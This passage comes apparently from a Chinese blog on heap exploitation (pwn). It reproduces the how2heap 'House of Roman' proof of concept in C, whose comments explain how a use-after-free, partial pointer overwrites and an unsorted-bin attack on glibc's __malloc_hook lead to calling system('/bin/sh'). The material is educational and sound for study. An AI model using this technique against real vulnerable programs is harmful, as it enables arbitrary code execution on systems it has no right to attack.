<h3 id="源码-16"><a href="#源码-16" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE     <span class="comment">/* for RTLD_NEXT */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* shell = <span class="string">&quot;/bin/sh\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">Technique was tested on GLibC 2.23, 2.24 via the glibc_build.sh script inside of how2heap on Ubuntu 16.04. 2.25 was tested on Ubuntu 17.04.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Compile: gcc -fPIE -pie house_of_roman.c -o house_of_roman</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">POC written by Maxwell Dulin (Strikeout) </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Use this in order to turn off printf buffering (messes with heap alignment)</span></span><br><span class="line"><span class="function"><span class="type">void</span>* <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">setvbuf</span>(stdout, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">setvbuf</span>(stdin, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	The main goal of this technique is to create a **leakless** heap </span></span><br><span class="line"><span class="comment">	exploitation technique in order to get a shell. This is mainly </span></span><br><span class="line"><span class="comment">	done using **relative overwrites** in order to get pointers in </span></span><br><span class="line"><span class="comment">	the proper locations without knowing the exact value of the pointer.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	The first step is to get a pointer inside of __malloc_hook. This </span></span><br><span class="line"><span class="comment">	is done by creating a fastbin bin that looks like the following: </span></span><br><span class="line"><span class="comment">	ptr_to_chunk -&gt; ptr_to_libc. Then, we alter the ptr_to_libc</span></span><br><span class="line"><span class="comment">	 (with a relative overwrite) to point to __malloc_hook. </span></span><br><span class="line"><span class="comment">			</span></span><br><span class="line"><span class="comment">	The next step is to run an unsorted bin attack on the __malloc_hook </span></span><br><span class="line"><span class="comment">	(which is now controllable from the previous attack).  Again, we run </span></span><br><span class="line"><span class="comment">	the unsorted_bin attack by altering the chunk-&gt;bk with a relative overwrite. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Finally, after launching the unsorted_bin attack to put a libc value </span></span><br><span class="line"><span class="comment">	inside of __malloc_hook, we use another relative overwrite on the </span></span><br><span class="line"><span class="comment">	value of __malloc_hook to point to a one_gadget, system or some other function.</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	Now, the next time we run malloc we pop a shell! :) </span></span><br><span class="line"><span class="comment">	However, this does come at a cost: 12 bits of randomness must be </span></span><br><span class="line"><span class="comment">	brute forced (0.02% chance) of working.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	The original write up for the *House of Roman* can be found at</span></span><br><span class="line"><span class="comment">	 https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc#assumptions.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	This technique requires the ability to edit fastbin and unsorted bin </span></span><br><span class="line"><span class="comment">	pointers via UAF or overflow of some kind. Additionally, good control </span></span><br><span class="line"><span class="comment">	over the allocations sizes and freeing is required for this technique.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="type">char</span>* introduction = <span class="string">&quot;\nWelcome to the House of Roman\n\n&quot;</span></span><br><span class="line">			     <span class="string">&quot;This is a heap exploitation technique that is LEAKLESS.\n&quot;</span></span><br><span class="line">			     <span class="string">&quot;There are three stages to the attack: \n\n&quot;</span></span><br><span class="line">			     <span class="string">&quot;1. Point a fastbin chunk to __malloc_hook.\n&quot;</span></span><br><span class="line">			     <span class="string">&quot;2. Run the unsorted_bin attack on __malloc_hook.\n&quot;</span></span><br><span class="line">			     <span class="string">&quot;3. Relative overwrite on main_arena at __malloc_hook.\n\n&quot;</span></span><br><span class="line">			     <span class="string">&quot;All of the stuff mentioned above is done using two main concepts:\n&quot;</span></span><br><span class="line">                             <span class="string">&quot;relative overwrites and heap feng shui.\n\n&quot;</span></span><br><span class="line">			     <span class="string">&quot;However, this technique comes at a cost:\n&quot;</span></span><br><span class="line">                             <span class="string">&quot;12-bits of entropy need to be brute forced.\n&quot;</span></span><br><span class="line">			     <span class="string">&quot;That means this technique only work 1 out of every 4096 tries or 0.02%.\n&quot;</span></span><br><span class="line">			     <span class="string">&quot;**NOTE**: For the purpose of this exploit, we set the random values in order to make this consisient\n\n\n&quot;</span>;</span><br><span class="line">	<span class="built_in">puts</span>(introduction);	</span><br><span class="line">	<span class="built_in">init</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*	</span></span><br><span class="line"><span class="comment">	Part 1: Fastbin Chunk points to __malloc_hook</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Getting the main_arena in a fastbin chunk ordering is the first step.</span></span><br><span class="line"><span class="comment">	This requires a ton of heap feng shui in order to line this up properly. </span></span><br><span class="line"><span class="comment">	However, at a glance, it looks like the following:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	First, we need to get a chunk that is in the fastbin with a pointer to</span></span><br><span class="line"><span class="comment">	a heap chunk in the fd. </span></span><br><span class="line"><span class="comment">	Second, we point this chunk to a pointer to LibC (in another heap chunk). </span></span><br><span class="line"><span class="comment">	All of the setup below is in order to get the configuration mentioned </span></span><br><span class="line"><span class="comment">	above setup to perform the relative overwrites. &quot;;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Getting the pointer to libC can be done in two ways: </span></span><br><span class="line"><span class="comment">			- A split from a chunk in the small/large/unsorted_bins </span></span><br><span class="line"><span class="comment">				gets allocated to a size of 0x70. </span></span><br><span class="line"><span class="comment">			- Overwrite the size of a small/large chunk used previously to 0x71.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	For the sake of example, this uses the first option because it </span></span><br><span class="line"><span class="comment">	requires less vulnerabilities.	</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Step 1: Point fastbin chunk to __malloc_hook\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Setting up chunks for relative overwrites with heap feng shui.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Use this as the UAF chunk later to edit the heap pointer later to point to the LibC value.	</span></span><br><span class="line">	<span class="type">uint8_t</span>* fastbin_victim = <span class="built_in">malloc</span>(<span class="number">0x60</span>); </span><br><span class="line"></span><br><span class="line">	<span class="comment">// Allocate this in order to have good alignment for relative </span></span><br><span class="line">	<span class="comment">// offsets later (only want to overwrite a single byte to prevent </span></span><br><span class="line">	<span class="comment">// 4 bits of brute on the heap).</span></span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Offset 0x100</span></span><br><span class="line">	<span class="type">uint8_t</span>* main_arena_use = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Offset 0x190</span></span><br><span class="line">	<span class="comment">// This ptr will be used for a relative offset on the &#x27;main_arena_use&#x27; chunk</span></span><br><span class="line">	<span class="type">uint8_t</span>* relative_offset_heap = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Free the chunk to put it into the unsorted_bin. </span></span><br><span class="line">	<span class="comment">// This chunk will have a pointer to main_arena + 0x68 in both the fd and bk pointers.</span></span><br><span class="line">	<span class="built_in">free</span>(main_arena_use);</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	Get part of the unsorted_bin chunk (the one that we just freed). </span></span><br><span class="line"><span class="comment">	We want this chunk because the fd and bk of this chunk will </span></span><br><span class="line"><span class="comment">	contain main_arena ptrs (used for relative overwrite later).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	The size is particularly set at 0x60 to put this into the 0x70 fastbin later. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	This has to be the same size because the __malloc_hook fake </span></span><br><span class="line"><span class="comment">	chunk (used later) uses the fastbin size of 0x7f. There is</span></span><br><span class="line"><span class="comment">	 a security check (within malloc) that the size of the chunk matches the fastbin size.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Allocate chunk that has a pointer to LibC main_arena inside of fd ptr.\n&quot;</span>);</span><br><span class="line"><span class="comment">//Offset 0x100. Has main_arena + 0x68 in fd and bk.</span></span><br><span class="line">	<span class="type">uint8_t</span>* fake_libc_chunk = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//// <span class="doctag">NOTE:</span> This is NOT part of the exploit... \\\</span></span><br><span class="line"><span class="comment">	// The __malloc_hook is calculated in order for the offsets to be found so that this exploit works on a handful of versions of GLibC. </span></span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> __malloc_hook = ((<span class="type">long</span>*)fake_libc_chunk)[<span class="number">0</span>] - <span class="number">0xe8</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// We need the filler because the overwrite below needs </span></span><br><span class="line">	<span class="comment">// to have a ptr in the fd slot in order to work. </span></span><br><span class="line">	<span class="comment">//Freeing this chunk puts a chunk in the fd slot of &#x27;fastbin_victim&#x27; to be used later. </span></span><br><span class="line">	<span class="built_in">free</span>(relative_offset_heap);	</span><br><span class="line"></span><br><span class="line">    	<span class="comment">/* </span></span><br><span class="line"><span class="comment">    	Create a UAF on the chunk. Recall that the chunk that fastbin_victim </span></span><br><span class="line"><span class="comment">	points to is currently at the offset 0x190 (heap_relative_offset).</span></span><br><span class="line"><span class="comment">     	*/</span></span><br><span class="line">	<span class="built_in">free</span>(fastbin_victim);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Now, we start doing the relative overwrites, since that we have </span></span><br><span class="line"><span class="comment">	the pointers in their proper locations. The layout is very important to </span></span><br><span class="line"><span class="comment">	understand for this.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Current heap layout: </span></span><br><span class="line"><span class="comment">	0x0:   fastbin_victim       - size 0x70 </span></span><br><span class="line"><span class="comment">	0x70:  alignment_filler     - size 0x90</span></span><br><span class="line"><span class="comment">	0x100: fake_libc_chunk      - size 0x70</span></span><br><span class="line"><span class="comment">	0x170: leftover_main        - size 0x20</span></span><br><span class="line"><span class="comment">	0x190: relative_offset_heap - size 0x70 </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	bin layout: </span></span><br><span class="line"><span class="comment">			fastbin:  fastbin_victim -&gt; relative_offset_heap</span></span><br><span class="line"><span class="comment">			unsorted: leftover_main</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	Now, the relative overwriting begins:</span></span><br><span class="line"><span class="comment">	Recall that fastbin_victim points to relative_offset_heap </span></span><br><span class="line"><span class="comment">	(which is in the 0x100-0x200 offset range). The fastbin uses a singly </span></span><br><span class="line"><span class="comment">	linked list, with the next chunk in the &#x27;fd&#x27; slot.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	By *partially* editing the fastbin_victim&#x27;s last byte (from 0x90 </span></span><br><span class="line"><span class="comment">	to 0x00) we have moved the fd pointer of fastbin_victim to </span></span><br><span class="line"><span class="comment">	fake_libc_chunk (at offset 0x100).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Also, recall that fake_libc_chunk had previously been in the unsorted_bin. </span></span><br><span class="line"><span class="comment">	Because of this, it has a fd pointer that points to main_arena + 0x68. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Now, the fastbin looks like the following: </span></span><br><span class="line"><span class="comment">	fastbin_victim -&gt; fake_libc_chunk -&gt;(main_arena + 0x68).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	The relative overwrites (mentioned above) will be demonstrates step by step below.</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">Overwrite the first byte of a heap chunk in order to point the fastbin chunk\n\</span></span><br><span class="line"><span class="string">to the chunk with the LibC address\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">Fastbin 0x70 now looks like this:\n\</span></span><br><span class="line"><span class="string">heap_addr -&gt; heap_addr2 -&gt; LibC_main_arena\n&quot;</span>);</span><br><span class="line">	fastbin_victim[<span class="number">0</span>] = <span class="number">0x00</span>; <span class="comment">// The location of this is at 0x100. But, we only want to overwrite the first byte. So, we put 0x0 for this.</span></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Now, we have a fastbin that looks like the following: </span></span><br><span class="line"><span class="comment">			0x70: fastbin_victim -&gt; fake_libc_chunk -&gt; (main_arena + 0x68)</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	We want the fd ptr in fake_libc_chunk to point to something useful. </span></span><br><span class="line"><span class="comment">	So, let&#x27;s edit this to point to the location of the __malloc_hook. </span></span><br><span class="line"><span class="comment">	This way, we can get control of a function ptr.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	To do this, we need a valid malloc size. Within the __memalign_hook </span></span><br><span class="line"><span class="comment">	is usually an address that usually starts with 0x7f. </span></span><br><span class="line"><span class="comment">	Because __memalign_hook value is right before this are all 0s, </span></span><br><span class="line"><span class="comment">	we could use a misaligned chunk to get this to work as a valid size in </span></span><br><span class="line"><span class="comment">	the 0x70 fastbin.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	This is where the first 4 bits of randomness come into play. </span></span><br><span class="line"><span class="comment">	The first 12 bits of the LibC address are deterministic for the address. </span></span><br><span class="line"><span class="comment">	However, the next 4 (for a total of 2 bytes) are not. </span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	So, we have to brute force 2^4 different possibilities (16) </span></span><br><span class="line"><span class="comment">	in order to get this in the correct location. This &#x27;location&#x27; </span></span><br><span class="line"><span class="comment">	is different for each version of GLibC (should be noted).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	After doing this relative overwrite, the fastbin looks like the following:</span></span><br><span class="line"><span class="comment">			0x70: fastbin_victim -&gt; fake_libc_chunk -&gt; (__malloc_hook - 0x23).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	Relatively overwrite the main_arena pointer to point to a valid </span></span><br><span class="line"><span class="comment">	chunk close to __malloc_hook.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	///// <span class="doctag">NOTE:</span> In order to make this exploit consistent </span></span><br><span class="line"><span class="comment">	(not brute forcing with hardcoded offsets), we MANUALLY set the values. \\\</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	In the actual attack, this values would need to be specific </span></span><br><span class="line"><span class="comment">	to a version and some of the bits would have to be brute forced </span></span><br><span class="line"><span class="comment">	(depending on the bits).</span></span><br><span class="line"><span class="comment">	*/</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">Use a relative overwrite on the main_arena pointer in the fastbin.\n\</span></span><br><span class="line"><span class="string">Point this close to __malloc_hook in order to create a fake fastbin chunk\n&quot;</span>);</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> __malloc_hook_adjust = __malloc_hook - <span class="number">0x23</span>; <span class="comment">// We substract 0x23 from the malloc because we want to use a 0x7f as a valid fastbin chunk size.</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// The relative overwrite</span></span><br><span class="line">	<span class="type">int8_t</span> byte1 = (__malloc_hook_adjust) &amp; <span class="number">0xff</span>; 	</span><br><span class="line">	<span class="type">int8_t</span> byte2 = (__malloc_hook_adjust &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span>; </span><br><span class="line">	fake_libc_chunk[<span class="number">0</span>] = byte1; <span class="comment">// Least significant bytes of the address.</span></span><br><span class="line">	fake_libc_chunk[<span class="number">1</span>] = byte2; <span class="comment">// The upper most 4 bits of this must be brute forced in a real attack.</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Two filler chunks prior to the __malloc_hook chunk in the fastbin. </span></span><br><span class="line">	<span class="comment">// These are fastbin_victim and fake_libc_chunk.</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Get the fake chunk pointing close to __malloc_hook\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">In a real exploit, this would fail 15/16 times\n\</span></span><br><span class="line"><span class="string">because of the final half byet of the malloc_hook being random\n&quot;</span>);	</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// If the 4 bit brute force did not work, this will crash because </span></span><br><span class="line">	<span class="comment">// of the chunk size not matching the bin for the chunk. </span></span><br><span class="line">	<span class="comment">// Otherwise, the next step of the attack can begin.</span></span><br><span class="line">	<span class="type">uint8_t</span>* malloc_hook_chunk = <span class="built_in">malloc</span>(<span class="number">0x60</span>);	</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Passed step 1 =)\n\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Part 2: Unsorted_bin attack </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Now, we have control over the location of the __malloc_hook. </span></span><br><span class="line"><span class="comment">	However, we do not know the address of LibC still. So, we cannot </span></span><br><span class="line"><span class="comment">	do much with this attack. In order to pop a shell, we need </span></span><br><span class="line"><span class="comment">	to get an address at the location of the __malloc_hook.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	We will use the unsorted_bin attack in order to change the value </span></span><br><span class="line"><span class="comment">	of the __malloc_hook with the address of main_arena + 0x68. </span></span><br><span class="line"><span class="comment">	For more information on the unsorted_bin attack, review </span></span><br><span class="line"><span class="comment">	https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsorted_bin_attack.c.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	For a brief overview, the unsorted_bin attack allows us to write</span></span><br><span class="line"><span class="comment">	main_arena + 0x68 to any location by altering the chunk-&gt;bk of</span></span><br><span class="line"><span class="comment">	an unsorted_bin chunk. We will choose to write this to the </span></span><br><span class="line"><span class="comment">	location of __malloc_hook.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	After we overwrite __malloc_hook with the main_arena, we will </span></span><br><span class="line"><span class="comment">	edit the pointer (with a relative overwrite) to point to a </span></span><br><span class="line"><span class="comment">	one_gadget for immediate code execution.</span></span><br><span class="line"><span class="comment">			</span></span><br><span class="line"><span class="comment">	Again, this relative overwrite works well but requires an additional </span></span><br><span class="line"><span class="comment">	1 byte (8 bits) of brute force.</span></span><br><span class="line"><span class="comment">	This brings the chances of a successful attempt up to 12 bits of </span></span><br><span class="line"><span class="comment">	randomness. This has about a 1/4096 or a 0.0244% chance of working.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	The steps for phase two of the attack are explained as we go below.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">Start Step 2: Unsorted_bin attack\n\n\</span></span><br><span class="line"><span class="string">The unsorted bin attack gives us the ability to write a\n\</span></span><br><span class="line"><span class="string">large value to ANY location. But, we do not control the value\n\</span></span><br><span class="line"><span class="string">This value is always main_arena + 0x68. \n\</span></span><br><span class="line"><span class="string">We point the unsorted_bin attack to __malloc_hook for a \n\</span></span><br><span class="line"><span class="string">relative overwrite later.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get the chunk to corrupt. Add another ptr in order to prevent consolidation upon freeing.</span></span><br><span class="line">	</span><br><span class="line">	<span class="type">uint8_t</span>* unsorted_bin_ptr = <span class="built_in">malloc</span>(<span class="number">0x80</span>);	</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x30</span>); <span class="comment">// Don&#x27;t want to consolidate</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Put chunk into unsorted_bin\n&quot;</span>);</span><br><span class="line">	<span class="comment">// Free the chunk to create the UAF</span></span><br><span class="line">	<span class="built_in">free</span>(unsorted_bin_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* /// <span class="doctag">NOTE:</span> The last 4 bits of byte2 would have been brute forced earlier. \\\ </span></span><br><span class="line"><span class="comment">	 However, for the sake of example, this has been calculated dynamically. </span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	__malloc_hook_adjust = __malloc_hook - <span class="number">0x10</span>; <span class="comment">// This subtract 0x10 is needed because of the chunk-&gt;fd doing the actual overwrite on the unsorted_bin attack.</span></span><br><span class="line">	byte1 = (__malloc_hook_adjust) &amp; <span class="number">0xff</span>; 	</span><br><span class="line">	byte2 = (__malloc_hook_adjust &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span>; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Use another relative offset to overwrite the ptr of the chunk-&gt;bk pointer.</span></span><br><span class="line">	<span class="comment">// From the previous brute force (4 bits from before) we </span></span><br><span class="line">	<span class="comment">// know where the location of this is at. It is 5 bytes away from __malloc_hook.</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Overwrite last two bytes of the chunk to point to __malloc_hook\n&quot;</span>);</span><br><span class="line">	unsorted_bin_ptr[<span class="number">8</span>] = byte1; <span class="comment">// Byte 0 of bk. 	</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// //// <span class="doctag">NOTE:</span> Normally, the second half of the byte would HAVE to be brute forced. However, for the sake of example, we set this in order to make the exploit consistent. ///</span></span><br><span class="line">	unsorted_bin_ptr[<span class="number">9</span>] = byte2; <span class="comment">// Byte 1 of bk. The second 4 bits of this was brute forced earlier, the first 4 bits are static.</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	Trigger the unsorted bin attack.</span></span><br><span class="line"><span class="comment">	This will write the value of (main_arena + 0x68) to whatever is in the bk ptr + 0x10.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	A few things do happen though: </span></span><br><span class="line"><span class="comment">		- This makes the unsorted bin (hence, small and large too) </span></span><br><span class="line"><span class="comment">		   unusable. So, only allocations previously in the fastbin can only be used now.</span></span><br><span class="line"><span class="comment">		- If the same size chunk (the unsorted_bin attack chunk) </span></span><br><span class="line"><span class="comment">		   is NOT malloc&#x27;ed, the program will crash immediately afterwards. </span></span><br><span class="line"><span class="comment">		   So, the allocation request must be the same as the unsorted_bin chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	The first point is totally fine (in this attack). But, in more complicated </span></span><br><span class="line"><span class="comment">	programming, this can be an issue.</span></span><br><span class="line"><span class="comment">	The second just requires us to do the same size allocaton as the current chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Trigger the unsorted_bin attack\n&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x80</span>); <span class="comment">// Trigger the unsorted_bin attack to overwrite __malloc_hook with main_arena + 0x68</span></span><br><span class="line"></span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> system_addr = (<span class="type">long</span> <span class="type">long</span>)<span class="built_in">dlsym</span>(RTLD_NEXT, <span class="string">&quot;system&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Passed step 2 =)\n\n\n&quot;</span>);</span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	Step 3: Set __malloc_hook to system</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	The chunk itself is allocated 19 bytes away from __malloc_hook. </span></span><br><span class="line"><span class="comment">	So, we use a realtive overwrite (again) in order to partially overwrite </span></span><br><span class="line"><span class="comment">	the main_arena pointer (from unsorted_bin attack) to point to system.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	In a real attack, the first 12 bits are static (per version). </span></span><br><span class="line"><span class="comment">	But, after that, the next 12 bits must be brute forced. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	/// <span class="doctag">NOTE:</span> For the sake of example, we will be setting these values, instead of brute forcing them. \\\</span></span><br><span class="line"><span class="comment">	*/</span> </span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Step 3: Set __malloc_hook to system/one_gadget\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">Now that we have a pointer to LibC inside of __malloc_hook (from step 2), \n\</span></span><br><span class="line"><span class="string">we can use a relative overwrite to point this to system or a one_gadget.\n\</span></span><br><span class="line"><span class="string">Note: In a real attack, this would be where the last 8 bits of brute forcing\n\</span></span><br><span class="line"><span class="string">comes from.\n&quot;</span>);</span><br><span class="line">	malloc_hook_chunk[<span class="number">19</span>] = system_addr &amp; <span class="number">0xff</span>; <span class="comment">// The first 12 bits are static (per version).</span></span><br><span class="line"></span><br><span class="line">	malloc_hook_chunk[<span class="number">20</span>] = (system_addr &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>;  <span class="comment">// The last 4 bits of this must be brute forced (done previously already).</span></span><br><span class="line">	malloc_hook_chunk[<span class="number">21</span>] = (system_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>;  <span class="comment">// The last byte is the remaining 8 bits that must be brute forced.</span></span><br><span class="line">	malloc_hook_chunk[<span class="number">22</span>] = (system_addr &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>; <span class="comment">// If the gap is between the data and text section is super wide, this is also needed. Just putting this in to be safe.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Trigger the malloc call for code execution via the system call being ran from the __malloc_hook.</span></span><br><span class="line">	<span class="comment">// In a real example, you would probably want to use a one_gadget. </span></span><br><span class="line">	<span class="comment">// But, to keep things portable, we will just use system and add a pointer to /bin/sh as the parameter</span></span><br><span class="line">	<span class="comment">// Although this is kind of cheating (the binary is PIE), if the binary was not PIE having a pointer into the .bss section would work without a single leak. </span></span><br><span class="line">	<span class="comment">// To get the system address (eariler on for consistency), the binary must be PIE though. So, the address is put in here.</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Pop Shell!&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>((<span class="type">long</span> <span class="type">long</span>)shell);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="调试-16"><a href="#调试-16" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013204026160.png"
                      alt="image-20231013204026160"
                ></p>
